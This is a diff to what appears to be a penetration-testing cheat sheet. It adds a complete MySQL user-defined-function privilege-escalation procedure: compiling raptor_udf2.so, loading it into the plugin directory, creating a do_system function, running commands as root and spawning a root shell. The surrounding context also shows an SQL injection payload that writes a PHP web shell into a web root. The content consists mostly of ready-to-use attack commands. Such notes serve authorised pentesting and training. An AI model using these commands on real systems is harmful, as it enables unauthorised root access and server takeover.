@@ -1797,7 +1797,8 @@ ldapsearch -x -h IP_here -s base namingcontexts
 /path/to/lse.sh -i
 
 # increase level of detail
-/path/to/lse.sh -l 1
+/path/to/lse.sh -l 1 # relevant infor for priv esc
+/path/to/lse.sh -l 2 # complete info dump
 ```
 
 
@@ -2093,6 +2094,30 @@ UNION all select 1,...,"content_here" into OUTFILE '/path/to/outfile'
 
 # write php shell in web root
 UNION all select 1,...,"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/path/to/outfile'
+
+# get shell via user-defined function (UDF) --> https://www.exploit-db.com/exploits/1518
+# compile shared object / library
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+# connect to db
+mysql -u root -p
+# access mysql database
+use mysql;
+# create new table
+create table foo(line blob);
+# import library
+insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
+# write library to directory on path
+select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+# create UDF
+create function do_system returns integer soname 'raptor_udf2.so';
+# check import
+select * from mysql.func;
+# priv esc to root (if mysqld runs as root!)
+select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
+# spawn root shell
+\! sh
+\! bash
 ```
 
 
